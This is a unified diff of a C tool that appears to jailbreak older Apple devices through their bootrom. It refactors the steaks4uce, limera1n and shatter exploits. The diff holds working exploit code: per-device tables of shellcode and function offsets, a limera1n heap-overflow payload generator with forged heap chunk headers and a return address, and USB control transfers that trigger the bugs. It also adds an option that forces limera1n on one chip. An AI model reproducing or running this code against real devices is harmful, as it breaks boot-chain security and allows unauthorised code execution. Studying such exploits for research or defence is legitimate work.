@@ -10,7 +10,7 @@
 
 #define MAX_PACKET_SIZE 0x800
 
-const uint32_t constants_240_4[] = {
+static const uint32_t constants_240_4[] = {
     0x22030000, //  1 - MAIN_STACK_ADDRESS
         0x3af5, //  2 - nor_power_on
         0x486d, //  3 - nor_init
@@ -39,7 +39,7 @@ const uint32_t constants_240_4[] = {
         0x23a3  // 26 - image3_load_fail
 };
 
-const uint32_t constants_240_5_1[] = {
+static const uint32_t constants_240_5_1[] = {
     0x22030000, //  1 - MAIN_STACK_ADDRESS
         0x3afd, //  2 - nor_power_on
         0x4875, //  3 - nor_init
@@ -68,7 +68,7 @@ const uint32_t constants_240_5_1[] = {
         0x23ab  // 26 - image3_load_fail
 };
 
-const uint32_t payload_data[] = {
+static const uint32_t steaks4uce_payload[] = {
           0x84, // 0x00: previous_chunk
           0x05, // 0x04: next_chunk
           0x80, // 0x08: buffer[0] - direction
@@ -85,179 +85,105 @@ const uint32_t payload_data[] = {
     0x2202D7FC  // 0x34: bk - LR on the stack
 };
 
-int gen_limera1n(irecv_client_t client, unsigned char **payload, size_t *payload_len) {
-    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
+static const uint32_t constants_359_3[] = {
+    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+        0x83d4, //#  3 - memmove
+    0x84034000, //#  4 - MAIN_STACK_ADDRESS
+        0x43c9, //#  5 - nor_power_on
+        0x5ded, //#  6 - nor_init
+    0x84024820, //#  7 - gUSBSerialNumber
+        0x8e7d, //#  8 - strlcat
+        0x349d, //#  9 - usb_wait_for_image
+    0x84000000, //# 10 - LOAD_ADDRESS
+       0x24000, //# 11 - MAX_SIZE
+    0x84024228, //# 12 - gLeakingDFUBuffer
+        0x1ccd, //# 13 - free
+    0x65786563, //# 14 - EXEC_MAGIC
+        0x1f79, //# 15 - memz_create
+        0x3969, //# 16 - jump_to
+        0x1fa1, //# 17 - memz_destroy
+          0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
+          0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x1fe5, //# 20 - image3_create_struct
+        0x2655, //# 21 - image3_load_continue
+        0x277b, //# 22 - image3_load_fail
+};
 
-    const uint32_t *constants = NULL;
-    size_t constants_len = 22;
-    uint32_t exploit_lr = 0;
+static const uint32_t constants_359_3_2[] = {
+    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+        0x83dc, //#  3 - memmove
+    0x84034000, //#  4 - MAIN_STACK_ADDRESS
+        0x43d1, //#  5 - nor_power_on
+        0x5df5, //#  6 - nor_init
+    0x84024820, //#  7 - gUSBSerialNumber
+        0x8e85, //#  8 - strlcat
+        0x34a5, //#  9 - usb_wait_for_image
+    0x84000000, //# 10 - LOAD_ADDRESS
+       0x24000, //# 11 - MAX_SIZE
+    0x84024228, //# 12 - gLeakingDFUBuffer
+        0x1ccd, //# 13 - free
+    0x65786563, //# 14 - EXEC_MAGIC
+        0x1f81, //# 15 - memz_create
+        0x3971, //# 16 - jump_to
+        0x1fa9, //# 17 - memz_destroy
+          0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
+          0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x1fed, //# 20 - image3_create_struct
+        0x265d, //# 21 - image3_load_continue
+        0x2783, //# 22 - image3_load_fail
+};
 
-    static const uint32_t constants_359_3[] = {
-        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-            0x83d4, //#  3 - memmove
-        0x84034000, //#  4 - MAIN_STACK_ADDRESS
-            0x43c9, //#  5 - nor_power_on
-            0x5ded, //#  6 - nor_init
-        0x84024820, //#  7 - gUSBSerialNumber
-            0x8e7d, //#  8 - strlcat
-            0x349d, //#  9 - usb_wait_for_image
-        0x84000000, //# 10 - LOAD_ADDRESS
-           0x24000, //# 11 - MAX_SIZE
-        0x84024228, //# 12 - gLeakingDFUBuffer
-            0x1ccd, //# 13 - free
-        0x65786563, //# 14 - EXEC_MAGIC
-            0x1f79, //# 15 - memz_create
-            0x3969, //# 16 - jump_to
-            0x1fa1, //# 17 - memz_destroy
-              0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
-              0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-            0x1fe5, //# 20 - image3_create_struct
-            0x2655, //# 21 - image3_load_continue
-            0x277b, //# 22 - image3_load_fail
-    };
+static const uint32_t constants_359_5[] = {
+    0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+        0x8564, //#  3 - memmove
+    0x84034000, //#  4 - MAIN_STACK_ADDRESS
+        0x43b9, //#  5 - nor_power_on
+        0x5f75, //#  6 - nor_init
+    0x84024750, //#  7 - gUSBSerialNumber
+        0x901d, //#  8 - strlcat
+        0x36e5, //#  9 - usb_wait_for_image
+    0x84000000, //# 10 - LOAD_ADDRESS
+       0x24000, //# 11 - MAX_SIZE
+    0x84024158, //# 12 - gLeakingDFUBuffer
+        0x1a51, //# 13 - free
+    0x65786563, //# 14 - EXEC_MAGIC
+        0x1f25, //# 15 - memz_create
+        0x39dd, //# 16 - jump_to
+        0x1f0d, //# 17 - memz_destroy
+          0x64, //# 18 - IMAGE3_LOAD_SP_OFFSET
+          0x60, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x2113, //# 20 - image3_create_struct
+        0x2665, //# 21 - image3_load_continue
+        0x276d, //# 22 - image3_load_fail
+};
 
-    static const uint32_t constants_359_3_2[] = {
-        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-            0x83dc, //#  3 - memmove
-        0x84034000, //#  4 - MAIN_STACK_ADDRESS
-            0x43d1, //#  5 - nor_power_on
-            0x5df5, //#  6 - nor_init
-        0x84024820, //#  7 - gUSBSerialNumber
-            0x8e85, //#  8 - strlcat
-            0x34a5, //#  9 - usb_wait_for_image
-        0x84000000, //# 10 - LOAD_ADDRESS
-           0x24000, //# 11 - MAX_SIZE
-        0x84024228, //# 12 - gLeakingDFUBuffer
-            0x1ccd, //# 13 - free
-        0x65786563, //# 14 - EXEC_MAGIC
-            0x1f81, //# 15 - memz_create
-            0x3971, //# 16 - jump_to
-            0x1fa9, //# 17 - memz_destroy
-              0x60, //# 18 - IMAGE3_LOAD_SP_OFFSET
-              0x50, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-            0x1fed, //# 20 - image3_create_struct
-            0x265d, //# 21 - image3_load_continue
-            0x2783, //# 22 - image3_load_fail
-    };
-
-    static const uint32_t constants_359_5[] = {
-        0x84031800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-            0x8564, //#  3 - memmove
-        0x84034000, //#  4 - MAIN_STACK_ADDRESS
-            0x43b9, //#  5 - nor_power_on
-            0x5f75, //#  6 - nor_init
-        0x84024750, //#  7 - gUSBSerialNumber
-            0x901d, //#  8 - strlcat
-            0x36e5, //#  9 - usb_wait_for_image
-        0x84000000, //# 10 - LOAD_ADDRESS
-           0x24000, //# 11 - MAX_SIZE
-        0x84024158, //# 12 - gLeakingDFUBuffer
-            0x1a51, //# 13 - free
-        0x65786563, //# 14 - EXEC_MAGIC
-            0x1f25, //# 15 - memz_create
-            0x39dd, //# 16 - jump_to
-            0x1f0d, //# 17 - memz_destroy
-              0x64, //# 18 - IMAGE3_LOAD_SP_OFFSET
-              0x60, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-            0x2113, //# 20 - image3_create_struct
-            0x2665, //# 21 - image3_load_continue
-            0x276d, //# 22 - image3_load_fail
-    };
-
-    static const uint32_t constants_574_4[] = {
-        0x84039800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
-              1024, //#  2 - RELOCATE_SHELLCODE_SIZE
-            0x84dc, //#  3 - memmove
-        0x8403c000, //#  4 - MAIN_STACK_ADDRESS
-            0x4e8d, //#  5 - nor_power_on
-            0x690d, //#  6 - nor_init
-        0x8402e0e0, //#  7 - gUSBSerialNumber
-            0x90c9, //#  8 - strlcat
-            0x4c85, //#  9 - usb_wait_for_image
-        0x84000000, //# 10 - LOAD_ADDRESS
-           0x2c000, //# 11 - MAX_SIZE
-        0x8402dbcc, //# 12 - gLeakingDFUBuffer
-            0x3b95, //# 13 - free
-        0x65786563, //# 14 - EXEC_MAGIC
-            0x7469, //# 15 - memz_create
-            0x5a5d, //# 16 - jump_to
-            0x7451, //# 17 - memz_destroy
-              0x68, //# 18 - IMAGE3_LOAD_SP_OFFSET
-              0x64, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
-            0x412d, //# 20 - image3_create_struct
-            0x46db, //# 21 - image3_load_continue
-            0x47db, //# 22 - image3_load_fail
-    };
-
-    switch(devinfo->cpid) {
-        case 0x8920:
-            if(!strcmp(devinfo->srtg, "iBoot-359.3")){ // oldBR
-                constants = constants_359_3;
-            } else { // newBR
-                constants = constants_359_3_2;
-            }
-            exploit_lr = 0x84033FA4;
-            break;
-        case 0x8922:
-            constants = constants_359_5;
-            exploit_lr = 0x84033F98;
-            break;
-        case 0x8930:
-            constants = constants_574_4;
-            exploit_lr = 0x8403BF9C;
-            break;
-        default:
-            printf("no payload offsets are available for this device.\n");
-            return -1;
-    }
-
-    size_t shellcode_len = limera1n_shellcode_len;
-    const unsigned char *shellcode = limera1n_shellcode;
-
-    size_t placeholders_offset = shellcode_len - (4 * constants_len);
-
-    // verify placeholders
-    for (size_t i = 0; i < constants_len; i++) {
-        uint32_t val;
-        memcpy(&val, shellcode + placeholders_offset + (i * 4), 4);
-        if (val != (0xBAD00001 + i)) {
-            printf("placeholder mismatch\n");
-            return -1;
-        }
-    }
-
-    uint32_t shellcode_address = 0x84000400 + 1;
-
-    unsigned char heap_block[64];
-    uint32_t header[4] = {0x405, 0x101, shellcode_address, exploit_lr};
-
-    memcpy(heap_block, header, 16);
-    memset(heap_block + 16, 0xCC, 48);
-
-    *payload_len = (64 * 16) + placeholders_offset + (4 * constants_len);
-    *payload = malloc(*payload_len);
-    if (!*payload) return -1;
-
-    unsigned char *p = *payload;
-
-    for (int i = 0; i < 16; i++) {
-        memcpy(p, heap_block, 64);
-        p += 64;
-    }
-
-    memcpy(p, shellcode, placeholders_offset);
-    p += placeholders_offset;
-
-    for (size_t i = 0; i < constants_len; i++) {
-        memcpy(p, &constants[i], 4);
-        p += 4;
-    }
-
-    return 0;
-}
+static const uint32_t constants_574_4[] = {
+    0x84039800, //#  1 - RELOCATE_SHELLCODE_ADDRESS
+          1024, //#  2 - RELOCATE_SHELLCODE_SIZE
+        0x84dc, //#  3 - memmove
+    0x8403c000, //#  4 - MAIN_STACK_ADDRESS
+        0x4e8d, //#  5 - nor_power_on
+        0x690d, //#  6 - nor_init
+    0x8402e0e0, //#  7 - gUSBSerialNumber
+        0x90c9, //#  8 - strlcat
+        0x4c85, //#  9 - usb_wait_for_image
+    0x84000000, //# 10 - LOAD_ADDRESS
+       0x2c000, //# 11 - MAX_SIZE
+    0x8402dbcc, //# 12 - gLeakingDFUBuffer
+        0x3b95, //# 13 - free
+    0x65786563, //# 14 - EXEC_MAGIC
+        0x7469, //# 15 - memz_create
+        0x5a5d, //# 16 - jump_to
+        0x7451, //# 17 - memz_destroy
+          0x68, //# 18 - IMAGE3_LOAD_SP_OFFSET
+          0x64, //# 19 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x412d, //# 20 - image3_create_struct
+        0x46db, //# 21 - image3_load_continue
+        0x47db, //# 22 - image3_load_fail
+};
 
 int acquire_device(irecv_client_t *client) {
     irecv_error_t err;
@@ -392,23 +318,28 @@ int steaks4uce_exploit(irecv_client_t client) {
 
     // Prepare shellcode
     const uint32_t *constants = NULL;
-    size_t const_offset = steaks4uce_shellcode_len - 4 * 26;
-    if (strstr(devinfo->srtg, "240.4"))
+    size_t constants_len = 26;
+    size_t placeholders_offset = steaks4uce_shellcode_len - (4 * constants_len);
+
+    if (!strcmp(devinfo->srtg, "iBoot-240.4"))
         constants = constants_240_4;
     else
         constants = constants_240_5_1;
-    for (int i = 0; i < 26; i++) {
-        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
-        if (*ptr != (0xBAD00001 + i)) {
-            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
+
+    // verify placeholders
+    for (size_t i = 0; i < constants_len; i++) {
+        uint32_t val;
+        memcpy(&val, steaks4uce_shellcode + placeholders_offset + (4 * i), 4);
+        if (val != (0xBAD00001 + i)) {
+            fprintf(stderr, "ERROR: Placeholder mismatch at index %zu (expected 0x%08x, got 0x%08x)\n", i, 0xBAD00001 + i, val);
             return -1;
         }
-        *ptr = constants[i];
+        memcpy(steaks4uce_shellcode + placeholders_offset + (4 * i), &constants[i], 4);
     }
 
     // Prepare payload
     unsigned char payload[0x138] = {0};
-    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
+    memcpy(payload + 0x100, steaks4uce_payload, sizeof(steaks4uce_payload));
 
     ret = reset_counters(client);
     if (ret < 0)
@@ -422,12 +353,10 @@ int steaks4uce_exploit(irecv_client_t client) {
     if (ret < 0)
         return -1;
 
-    printf("Triggering the exploit.\n");
+    printf("Executing exploit.\n");
     irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
 
     release_device(client);
-
-    usleep(10000);
 
     ret = acquire_device(&client);
     if (ret < 0)
@@ -547,6 +476,79 @@ int shatter_exploit(irecv_client_t client) {
     return 0;
 }
 
+int limera1n_generate_payload(irecv_client_t client, unsigned char **payload, size_t *payload_len) {
+    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
+
+    const uint32_t *constants = NULL;
+    size_t constants_len = 22;
+    uint32_t exploit_lr = 0;
+
+    switch(devinfo->cpid) {
+        case 0x8920:
+            if(!strcmp(devinfo->srtg, "iBoot-359.3"))
+                constants = constants_359_3;
+            else
+                constants = constants_359_3_2;
+            exploit_lr = 0x84033FA4;
+            break;
+        case 0x8922:
+            constants = constants_359_5;
+            exploit_lr = 0x84033F98;
+            break;
+        case 0x8930:
+            constants = constants_574_4;
+            exploit_lr = 0x8403BF9C;
+            break;
+        default:
+            printf("no payload offsets are available for this device.\n");
+            return -1;
+    }
+
+    size_t shellcode_len = limera1n_shellcode_len;
+    const unsigned char *shellcode = limera1n_shellcode;
+
+    size_t placeholders_offset = shellcode_len - (4 * constants_len);
+
+    // verify placeholders
+    for (size_t i = 0; i < constants_len; i++) {
+        uint32_t val;
+        memcpy(&val, shellcode + placeholders_offset + (4 * i), 4);
+        if (val != (0xBAD00001 + i)) {
+            fprintf(stderr, "ERROR: Placeholder mismatch at index %zu (expected 0x%08x, got 0x%08x)\n", i, 0xBAD00001 + i, val);
+            return -1;
+        }
+    }
+
+    uint32_t shellcode_address = 0x84000400 + 1;
+
+    unsigned char heap_block[64];
+    uint32_t header[4] = {0x405, 0x101, shellcode_address, exploit_lr};
+
+    memcpy(heap_block, header, 16);
+    memset(heap_block + 16, 0xCC, 48);
+
+    *payload_len = (64 * 16) + placeholders_offset + (4 * constants_len);
+    *payload = malloc(*payload_len);
+    if (!*payload) return -1;
+
+    unsigned char *p = *payload;
+
+    for (int i = 0; i < 16; i++) {
+        memcpy(p, heap_block, 64);
+        p += 64;
+    }
+
+    memcpy(p, shellcode, placeholders_offset);
+    p += placeholders_offset;
+
+    for (size_t i = 0; i < constants_len; i++) {
+        memcpy(p, &constants[i], 4);
+        p += 4;
+    }
+
+    return 0;
+}
+
 int limera1n_exploit(irecv_client_t client) {
     int ret;
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
@@ -557,7 +559,7 @@ int limera1n_exploit(irecv_client_t client) {
     memset(buf, 'A', 0x800);
     printf("*** based on limera1n exploit (heap overflow) by geohot ***\n");
 
-    if(gen_limera1n(client, &payload, &payload_len) != 0) {
+    if(limera1n_generate_payload(client, &payload, &payload_len) != 0) {
         fprintf(stderr, "Failed to generate payload!\n");
         return -1;
     }
@@ -687,8 +689,6 @@ int execute(irecv_client_t client, const unsigned char *cmd_buf, size_t cmd_len,
         return -1;
 
     release_device(client);
-
-    usleep(500000);
 
     ret = acquire_device(&client);
     if (ret < 0)
@@ -858,17 +858,20 @@ int main(int argc, char* argv[]) {
 
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[");
+    int use_limera1n = 0;
 
     if (strstr(devinfo->srtg, "359.3.2"))
         memmove_off = 0x83dc;
 
     if (argc > 1) {
-        if (p && strcmp(argv[1], "dumpnor") == 0 && devinfo->cpid == 0x8920) {
+        if (p && strcmp(argv[1], "--nor-dump") == 0 && devinfo->cpid == 0x8920) {
             ret = nor_dump(client, 1);
             return ret;
-        } else if (p && strcmp(argv[1], "flashnor") == 0 && devinfo->cpid == 0x8920) {
+        } else if (p && strcmp(argv[1], "--nor-flash") == 0 && devinfo->cpid == 0x8920) {
             // ret = nor_flash(client, argv[2]);
             // return ret;
+        } else if (strcmp(argv[1], "--use-limera1n") == 0 && devinfo->cpid == 0x8930) {
+            use_limera1n = 1;
         } else if (p) {
             ret = boot_unpacked_ibss(client, argv[1]);
             return ret;
@@ -883,7 +886,7 @@ int main(int argc, char* argv[]) {
 
     if (devinfo->cpid == 0x8720)
         exploit_func = steaks4uce_exploit;
-    else if (devinfo->cpid == 0x8920 || devinfo->cpid == 0x8922)
+    else if (devinfo->cpid == 0x8920 || devinfo->cpid == 0x8922 || use_limera1n == 1)
         exploit_func = limera1n_exploit;
     else if (devinfo->cpid == 0x8930)
         exploit_func = shatter_exploit;
